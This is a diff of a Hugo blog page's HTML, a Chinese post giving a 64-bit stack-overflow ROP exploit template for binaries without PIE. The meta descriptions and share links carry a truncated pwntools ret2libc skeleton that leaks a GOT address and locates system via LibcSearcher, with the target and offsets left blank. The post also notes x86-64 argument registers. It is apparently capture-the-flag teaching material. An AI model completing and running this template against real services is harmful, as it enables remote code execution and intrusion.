@@ -1,183 +1,189 @@
 <!DOCTYPE html>
-<html
-  dir="ltr"
-  lang="en"
-  data-theme=""
-><head>
-  <title>
-    
-      |
-      64位栈溢出rop模板(无PIE)
+<html lang="en-us">
+<head>
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> 64位栈溢出rop模板(无PIE) | Ssd&#39;s Blog</title>
+  <link rel = 'canonical' href = 'https://shaodongshi.github.io/posts/64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/'>
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="64位栈溢出rop模板(无PIE)" />
+<meta property="og:description" content="64位栈溢出rop模板（无PIE） exp模板 #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = &#39;debug&#39; #p = process(&#34;./&#34;) p = remote(&#34;&#34;,) elf = ELF(&#34;./&#34;) read_got = elf.got[&#39;read&#39;] puts_plt = elf.plt[&#39;puts&#39;] main_addr = pop_rdi = #************泄露got********* payload = b&#39;a&#39;*() &#43; p64(pop_rdi) &#43; p64(read_got) payload&#43;= p64(puts_plt) &#43; p64(main_addr) #payload = payload.ljust(200,&#39;b&#39;) p.sendline( payload) p.recvuntil(&#39;&#39;) read_addr = u64(p.recvuntil(&#39;\x0a&#39;)[:-1].ljust(8, &#39;\x00&#39;)) print hex(read_addr) #***************************** #***********搜索libc，寻址******* libc = LibcSearcher(&#34;read&#34;,read_addr) offset = read_addr - libc.dump(&#34;read&#34;) sys_addr = offset &#43; libc." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://shaodongshi.github.io/posts/64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-07-12T17:35:19+08:00" />
+<meta property="article:modified_time" content="2021-07-12T17:35:19+08:00" />
 
 
-    
-
-  </title>
-
-  
-  <meta charset="utf-8" /><meta name="generator" content="Hugo 0.85.0" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
-  <meta
-    name="description"
-    content="
-      
-
-
-    "
-  />
-  
-  
-  
-  <link
-    rel="stylesheet"
-    href="/css/main.min.51423ad97099a08f3a20e16d238c13adae76db7dd5e1913789bdc81143ff4cc6.css"
-    integrity="sha256-UUI62XCZoI86IOFtI4wTra52233V4ZE3ib3IEUP/TMY="
-    crossorigin="anonymous"
-    type="text/css"
-  />
-  
-  
-  <link
-    rel="stylesheet"
-    href="/css/markupHighlight.min.f798cbda9aaa38f89eb38be6414bd082cfd71a6780375cbf67b6d2fb2b96491e.css"
-    integrity="sha256-95jL2pqqOPies4vmQUvQgs/XGmeAN1y/Z7bS&#43;yuWSR4="
-    crossorigin="anonymous"
-    type="text/css"
-  />
-  
-  <link
-    rel="stylesheet"
-    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css"
-    integrity="sha512-+4zCK9k+qNFUR5X+cKL9EIR+ZOhtIloNl9GIKS57V1MyNsYpYcUrUeQc9vNfzsWfV28IaLL3i96P9sdNyeRssA=="
-    crossorigin="anonymous"
-  />
-  
-  <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
-  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
-  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
-  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
-
-  <link rel="canonical" href="/posts/64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/" />
-
-  
-  
-  
-  
-  <script
-    type="text/javascript"
-    src="/js/anatole-header.min.2a2cd9614b7d007dfbb75e8da19e3a0fa872ceab53c6d000c00b7a0c89b85bfc.js"
-    integrity="sha256-KizZYUt9AH37t16NoZ46D6hyzqtTxtAAwAt6DIm4W/w="
-    crossorigin="anonymous"
-  ></script>
-
-  
-    
-    
-    <script
-      type="text/javascript"
-      src="/js/anatole-theme-switcher.min.7fd87181cdd7e8413aa64b6867bb32f3a8dc242e684fc7d5bbb9f600dbc2b6eb.js"
-      integrity="sha256-f9hxgc3X6EE6pktoZ7sy86jcJC5oT8fVu7n2ANvCtus="
-      crossorigin="anonymous"
-    ></script>
-
-  
   <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="64位栈溢出rop模板(无PIE)"/>
 <meta name="twitter:description" content="64位栈溢出rop模板（无PIE） exp模板 #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = &#39;debug&#39; #p = process(&#34;./&#34;) p = remote(&#34;&#34;,) elf = ELF(&#34;./&#34;) read_got = elf.got[&#39;read&#39;] puts_plt = elf.plt[&#39;puts&#39;] main_addr = pop_rdi = #************泄露got********* payload = b&#39;a&#39;*() &#43; p64(pop_rdi) &#43; p64(read_got) payload&#43;= p64(puts_plt) &#43; p64(main_addr) #payload = payload.ljust(200,&#39;b&#39;) p.sendline( payload) p.recvuntil(&#39;&#39;) read_addr = u64(p.recvuntil(&#39;\x0a&#39;)[:-1].ljust(8, &#39;\x00&#39;)) print hex(read_addr) #***************************** #***********搜索libc，寻址******* libc = LibcSearcher(&#34;read&#34;,read_addr) offset = read_addr - libc.dump(&#34;read&#34;) sys_addr = offset &#43; libc."/>
 
+  
+  
+  
+  <link rel="stylesheet" href="https://shaodongshi.github.io/scss/style.scss" integrity=""> 
 
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
 
+  
+<link rel="icon" type="image/png" href="https://shaodongshi.github.io/images/favicon.ico" />
+
+  
   
 </head>
-<body>
-    <header><div
-  class="page-top 
-    animated fadeInDown
 
-  "
->
-  <a role="button" class="navbar-burger" data-target="navMenu" aria-label="menu" aria-expanded="false">
-    <span aria-hidden="true"></span>
-    <span aria-hidden="true"></span>
-    <span aria-hidden="true"></span>
-  </a>
-  <nav>
-    <ul class="nav__list" id="navMenu">
-      <div class="nav__links">
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
         
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
         
-        
-      </div>
-      <li>
-        
-          <a class="theme-switch" title="Switch Theme">
-            <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+        <li>
+          <a class="icon" href=" https://shaodongshi.github.io/posts/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/" aria-label="Previous">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
           </a>
-
+        </li>
         
-      </li>
-    </ul>
-  </nav>
-</div>
-</header>
-    <div class="wrapper">
-      <aside><div
-  class="sidebar
-    animated fadeInDown
-
-  "
->
-  <div class="sidebar__content">
-    <div class="logo-title">
-      <div class="title">
-        <img src="/" alt="profile picture" />
-        <h3 title=""><a href="/"></a></h3>
-        <div class="description">
-          <p></p>
-        </div>
-      </div>
-    </div>
-    <ul class="social-links">
+        
+        <li>
+          <a class="icon" href="https://shaodongshi.github.io/posts/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%8E%9F%E7%90%86/" aria-label="Next">
+            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
+          </a>
+        </li>
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#" aria-label="Share">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
       
-    </ul>
-  </div><footer class="footer footer--sidebar">
-  <div class="by_farbox">
-    <ul class="footer__list">
-      <li class="footer__item">
-        &copy;
-        
-          
-          2021
-
-
-        
-      </li>
-      
-    </ul>
-  </div>
-</footer>
+      <ul>
   
-  <script
-    type="text/javascript"
-    src="/js/medium-zoom.min.71100d84fab0ad794b8399a66ac810700cc78d703f715dc10af4d7ba7b761362.js"
-    integrity="sha256-cRANhPqwrXlLg5mmasgQcAzHjXA/cV3BCvTXunt2E2I="
-    crossorigin="anonymous"
-  ></script></div>
-</aside>
-      <main>
-        <div class="autopagerize_page_element">
-          <div class="content">
-  <div
-    class="post 
-      animated fadeInDown
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fshaodongshi.github.io%2fposts%2f64%25E4%25BD%258D%25E6%25A0%2588%25E6%25BA%25A2%25E5%2587%25BArop%25E6%25A8%25A1%25E6%259D%25BF%25E6%2597%25A0pie%2f" aria-label="Facebook">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fshaodongshi.github.io%2fposts%2f64%25E4%25BD%258D%25E6%25A0%2588%25E6%25BA%25A2%25E5%2587%25BArop%25E6%25A8%25A1%25E6%259D%25BF%25E6%2597%25A0pie%2f&text=64%e4%bd%8d%e6%a0%88%e6%ba%a2%e5%87%barop%e6%a8%a1%e6%9d%bf%28%e6%97%a0PIE%29" aria-label="Twitter">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fshaodongshi.github.io%2fposts%2f64%25E4%25BD%258D%25E6%25A0%2588%25E6%25BA%25A2%25E5%2587%25BArop%25E6%25A8%25A1%25E6%259D%25BF%25E6%2597%25A0pie%2f&title=64%e4%bd%8d%e6%a0%88%e6%ba%a2%e5%87%barop%e6%a8%a1%e6%9d%bf%28%e6%97%a0PIE%29" aria-label="Linkedin">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fshaodongshi.github.io%2fposts%2f64%25E4%25BD%258D%25E6%25A0%2588%25E6%25BA%25A2%25E5%2587%25BArop%25E6%25A8%25A1%25E6%259D%25BF%25E6%2597%25A0pie%2f&is_video=false&description=64%e4%bd%8d%e6%a0%88%e6%ba%a2%e5%87%barop%e6%a8%a1%e6%9d%bf%28%e6%97%a0PIE%29" aria-label="Pinterest">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=64%e4%bd%8d%e6%a0%88%e6%ba%a2%e5%87%barop%e6%a8%a1%e6%9d%bf%28%e6%97%a0PIE%29&body=Check out this article: https%3a%2f%2fshaodongshi.github.io%2fposts%2f64%25E4%25BD%258D%25E6%25A0%2588%25E6%25BA%25A2%25E5%2587%25BArop%25E6%25A8%25A1%25E6%259D%25BF%25E6%2597%25A0pie%2f" aria-label="Email">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fshaodongshi.github.io%2fposts%2f64%25E4%25BD%258D%25E6%25A0%2588%25E6%25BA%25A2%25E5%2587%25BArop%25E6%25A8%25A1%25E6%259D%25BF%25E6%2597%25A0pie%2f&title=64%e4%bd%8d%e6%a0%88%e6%ba%a2%e5%87%barop%e6%a8%a1%e6%9d%bf%28%e6%97%a0PIE%29" aria-label="Pocket">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fshaodongshi.github.io%2fposts%2f64%25E4%25BD%258D%25E6%25A0%2588%25E6%25BA%25A2%25E5%2587%25BArop%25E6%25A8%25A1%25E6%259D%25BF%25E6%2597%25A0pie%2f&title=64%e4%bd%8d%e6%a0%88%e6%ba%a2%e5%87%barop%e6%a8%a1%e6%9d%bf%28%e6%97%a0PIE%29" aria-label="reddit">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fshaodongshi.github.io%2fposts%2f64%25E4%25BD%258D%25E6%25A0%2588%25E6%25BA%25A2%25E5%2587%25BArop%25E6%25A8%25A1%25E6%259D%25BF%25E6%2597%25A0pie%2f&name=64%e4%bd%8d%e6%a0%88%e6%ba%a2%e5%87%barop%e6%a8%a1%e6%9d%bf%28%e6%97%a0PIE%29&description=64%e4%bd%8d%e6%a0%88%e6%ba%a2%e5%87%barop%e6%a8%a1%e6%9d%bf%ef%bc%88%e6%97%a0PIE%ef%bc%89%20exp%e6%a8%a1%e6%9d%bf%20%23%21usr%2fbin%2fenv%20python%20%23coding%3dutf-8%20from%20pwn%20import%20%2a%20from%20LibcSearcher%20import%20%2a%20context.log_level%20%3d%20%26%2339%3bdebug%26%2339%3b%20%23p%20%3d%20process%28%26%2334%3b.%2f%26%2334%3b%29%20p%20%3d%20remote%28%26%2334%3b%26%2334%3b%2c%29%20elf%20%3d%20ELF%28%26%2334%3b.%2f%26%2334%3b%29%20read_got%20%3d%20elf.got%5b%26%2339%3bread%26%2339%3b%5d%20puts_plt%20%3d%20elf.plt%5b%26%2339%3bputs%26%2339%3b%5d%20main_addr%20%3d%20pop_rdi%20%3d%20%23%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%e6%b3%84%e9%9c%b2got%2a%2a%2a%2a%2a%2a%2a%2a%2a%20payload%20%3d%20b%26%2339%3ba%26%2339%3b%2a%28%29%20%2b%20p64%28pop_rdi%29%20%2b%20p64%28read_got%29%20payload%2b%3d%20p64%28puts_plt%29%20%2b%20p64%28main_addr%29%20%23payload%20%3d%20payload.ljust%28200%2c%26%2339%3bb%26%2339%3b%29%20p.sendline%28%20payload%29%20p.recvuntil%28%26%2339%3b%26%2339%3b%29%20read_addr%20%3d%20u64%28p.recvuntil%28%26%2339%3b%5cx0a%26%2339%3b%29%5b%3a-1%5d.ljust%288%2c%20%26%2339%3b%5cx00%26%2339%3b%29%29%20print%20hex%28read_addr%29%20%23%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%20%23%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%e6%90%9c%e7%b4%a2libc%ef%bc%8c%e5%af%bb%e5%9d%80%2a%2a%2a%2a%2a%2a%2a%20libc%20%3d%20LibcSearcher%28%26%2334%3bread%26%2334%3b%2cread_addr%29%20offset%20%3d%20read_addr%20-%20libc.dump%28%26%2334%3bread%26%2334%3b%29%20sys_addr%20%3d%20offset%20%2b%20libc." aria-label="Tumblr">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fshaodongshi.github.io%2fposts%2f64%25E4%25BD%258D%25E6%25A0%2588%25E6%25BA%25A2%25E5%2587%25BArop%25E6%25A8%25A1%25E6%259D%25BF%25E6%2597%25A0pie%2f&t=64%e4%bd%8d%e6%a0%88%e6%ba%a2%e5%87%barop%e6%a8%a1%e6%9d%bf%28%e6%97%a0PIE%29" aria-label="Hacker News">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
 
-    "
-  >
-    <div class="post-content">
-      
-      <div class="post-title">
-        <h1>64位栈溢出rop模板(无PIE)</h1>
+    </div>
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#exp模板">exp模板</a></li>
+    <li><a href="#ropgadget">ROPgadget</a></li>
+    <li><a href="#64位传参">64位传参</a></li>
+  </ul>
+</nav>
+    </div>
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        64位栈溢出rop模板(无PIE)
+      </h1>
+      <div class="meta">
         
-      </div><h1 id="64位栈溢出rop模板无pie">64位栈溢出rop模板（无PIE）</h1>
+        <div class="postdate">
+          
+          <time datetime="2021-07-12 17:35:19 &#43;0800 CST" itemprop="datePublished">2021-07-12</time>
+          
+        </div>
+        
+        
+        
+        
+      </div>
+    </header>
+
+  
+    <div class="content" itemprop="articleBody">
+      <h1 id="64位栈溢出rop模板无pie">64位栈溢出rop模板（无PIE）</h1>
 <h2 id="exp模板">exp模板</h2>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!usr/bin/env python</span>
 <span style="color:#75715e">#coding=utf-8</span>
@@ -226,43 +232,131 @@ p<span style="color:#f92672">.</span>interactive()
 查找有int 0x80的地址</p>
 <h2 id="64位传参">64位传参</h2>
 <p>对于x64体系结构，如果函数参数不大于6个时，使用寄存器传参，对于函数参数大于6个的函数，前六个参数使用寄存器传递，后面的使用栈传递。参数传递的规律是固定的，即前6个参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9，后面的依次从 “右向左” 放入栈中。</p>
-</div>
-    <div class="post-footer">
-      <div class="info">
-        
 
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
         
-      </div>
+      </ul>
     </div>
 
-    
-  </div>
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#exp模板">exp模板</a></li>
+    <li><a href="#ropgadget">ROPgadget</a></li>
+    <li><a href="#64位传参">64位传参</a></li>
+  </ul>
+</nav>
+    </div>
 
-
-          </div>
-        </div>
-      </main>
-    </div><footer class="footer footer--base">
-  <div class="by_farbox">
-    <ul class="footer__list">
-      <li class="footer__item">
-        &copy;
-        
-          
-          2021
-
-
-        
-      </li>
+    <div id="share-footer" style="display: none">
       
-    </ul>
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fshaodongshi.github.io%2fposts%2f64%25E4%25BD%258D%25E6%25A0%2588%25E6%25BA%25A2%25E5%2587%25BArop%25E6%25A8%25A1%25E6%259D%25BF%25E6%2597%25A0pie%2f" aria-label="Facebook">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fshaodongshi.github.io%2fposts%2f64%25E4%25BD%258D%25E6%25A0%2588%25E6%25BA%25A2%25E5%2587%25BArop%25E6%25A8%25A1%25E6%259D%25BF%25E6%2597%25A0pie%2f&text=64%e4%bd%8d%e6%a0%88%e6%ba%a2%e5%87%barop%e6%a8%a1%e6%9d%bf%28%e6%97%a0PIE%29" aria-label="Twitter">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fshaodongshi.github.io%2fposts%2f64%25E4%25BD%258D%25E6%25A0%2588%25E6%25BA%25A2%25E5%2587%25BArop%25E6%25A8%25A1%25E6%259D%25BF%25E6%2597%25A0pie%2f&title=64%e4%bd%8d%e6%a0%88%e6%ba%a2%e5%87%barop%e6%a8%a1%e6%9d%bf%28%e6%97%a0PIE%29" aria-label="Linkedin">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fshaodongshi.github.io%2fposts%2f64%25E4%25BD%258D%25E6%25A0%2588%25E6%25BA%25A2%25E5%2587%25BArop%25E6%25A8%25A1%25E6%259D%25BF%25E6%2597%25A0pie%2f&is_video=false&description=64%e4%bd%8d%e6%a0%88%e6%ba%a2%e5%87%barop%e6%a8%a1%e6%9d%bf%28%e6%97%a0PIE%29" aria-label="Pinterest">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=64%e4%bd%8d%e6%a0%88%e6%ba%a2%e5%87%barop%e6%a8%a1%e6%9d%bf%28%e6%97%a0PIE%29&body=Check out this article: https%3a%2f%2fshaodongshi.github.io%2fposts%2f64%25E4%25BD%258D%25E6%25A0%2588%25E6%25BA%25A2%25E5%2587%25BArop%25E6%25A8%25A1%25E6%259D%25BF%25E6%2597%25A0pie%2f" aria-label="Email">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fshaodongshi.github.io%2fposts%2f64%25E4%25BD%258D%25E6%25A0%2588%25E6%25BA%25A2%25E5%2587%25BArop%25E6%25A8%25A1%25E6%259D%25BF%25E6%2597%25A0pie%2f&title=64%e4%bd%8d%e6%a0%88%e6%ba%a2%e5%87%barop%e6%a8%a1%e6%9d%bf%28%e6%97%a0PIE%29" aria-label="Pocket">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fshaodongshi.github.io%2fposts%2f64%25E4%25BD%258D%25E6%25A0%2588%25E6%25BA%25A2%25E5%2587%25BArop%25E6%25A8%25A1%25E6%259D%25BF%25E6%2597%25A0pie%2f&title=64%e4%bd%8d%e6%a0%88%e6%ba%a2%e5%87%barop%e6%a8%a1%e6%9d%bf%28%e6%97%a0PIE%29" aria-label="reddit">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fshaodongshi.github.io%2fposts%2f64%25E4%25BD%258D%25E6%25A0%2588%25E6%25BA%25A2%25E5%2587%25BArop%25E6%25A8%25A1%25E6%259D%25BF%25E6%2597%25A0pie%2f&name=64%e4%bd%8d%e6%a0%88%e6%ba%a2%e5%87%barop%e6%a8%a1%e6%9d%bf%28%e6%97%a0PIE%29&description=64%e4%bd%8d%e6%a0%88%e6%ba%a2%e5%87%barop%e6%a8%a1%e6%9d%bf%ef%bc%88%e6%97%a0PIE%ef%bc%89%20exp%e6%a8%a1%e6%9d%bf%20%23%21usr%2fbin%2fenv%20python%20%23coding%3dutf-8%20from%20pwn%20import%20%2a%20from%20LibcSearcher%20import%20%2a%20context.log_level%20%3d%20%26%2339%3bdebug%26%2339%3b%20%23p%20%3d%20process%28%26%2334%3b.%2f%26%2334%3b%29%20p%20%3d%20remote%28%26%2334%3b%26%2334%3b%2c%29%20elf%20%3d%20ELF%28%26%2334%3b.%2f%26%2334%3b%29%20read_got%20%3d%20elf.got%5b%26%2339%3bread%26%2339%3b%5d%20puts_plt%20%3d%20elf.plt%5b%26%2339%3bputs%26%2339%3b%5d%20main_addr%20%3d%20pop_rdi%20%3d%20%23%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%e6%b3%84%e9%9c%b2got%2a%2a%2a%2a%2a%2a%2a%2a%2a%20payload%20%3d%20b%26%2339%3ba%26%2339%3b%2a%28%29%20%2b%20p64%28pop_rdi%29%20%2b%20p64%28read_got%29%20payload%2b%3d%20p64%28puts_plt%29%20%2b%20p64%28main_addr%29%20%23payload%20%3d%20payload.ljust%28200%2c%26%2339%3bb%26%2339%3b%29%20p.sendline%28%20payload%29%20p.recvuntil%28%26%2339%3b%26%2339%3b%29%20read_addr%20%3d%20u64%28p.recvuntil%28%26%2339%3b%5cx0a%26%2339%3b%29%5b%3a-1%5d.ljust%288%2c%20%26%2339%3b%5cx00%26%2339%3b%29%29%20print%20hex%28read_addr%29%20%23%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%20%23%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%2a%e6%90%9c%e7%b4%a2libc%ef%bc%8c%e5%af%bb%e5%9d%80%2a%2a%2a%2a%2a%2a%2a%20libc%20%3d%20LibcSearcher%28%26%2334%3bread%26%2334%3b%2cread_addr%29%20offset%20%3d%20read_addr%20-%20libc.dump%28%26%2334%3bread%26%2334%3b%29%20sys_addr%20%3d%20offset%20%2b%20libc." aria-label="Tumblr">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fshaodongshi.github.io%2fposts%2f64%25E4%25BD%258D%25E6%25A0%2588%25E6%25BA%25A2%25E5%2587%25BArop%25E6%25A8%25A1%25E6%259D%25BF%25E6%2597%25A0pie%2f&t=64%e4%bd%8d%e6%a0%88%e6%ba%a2%e5%87%barop%e6%a8%a1%e6%9d%bf%28%e6%97%a0PIE%29" aria-label="Hacker News">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2021  Ssd&#39;s Blog 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        
+      </ul>
+    </nav>
   </div>
 </footer>
-  
-  <script
-    type="text/javascript"
-    src="/js/medium-zoom.min.71100d84fab0ad794b8399a66ac810700cc78d703f715dc10af4d7ba7b761362.js"
-    integrity="sha256-cRANhPqwrXlLg5mmasgQcAzHjXA/cV3BCvTXunt2E2I="
-    crossorigin="anonymous"
-  ></script></body>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+<script src=/js/code-copy.js></script>
+
+
+
 </html>
